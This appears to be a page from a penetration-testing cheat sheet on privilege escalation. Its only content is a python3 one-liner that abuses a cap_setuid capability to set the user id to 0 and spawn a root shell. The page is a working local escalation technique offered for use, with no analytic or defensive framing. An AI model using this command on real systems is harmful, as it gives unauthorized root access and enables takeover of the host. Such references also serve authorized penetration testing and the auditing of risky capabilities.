---
title: privilege escalation
weight: 23
---

# capabilities
----------------

exploit `cap_setuid` capability on python3 to gain a local root-shell
```shell
python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```
----------------
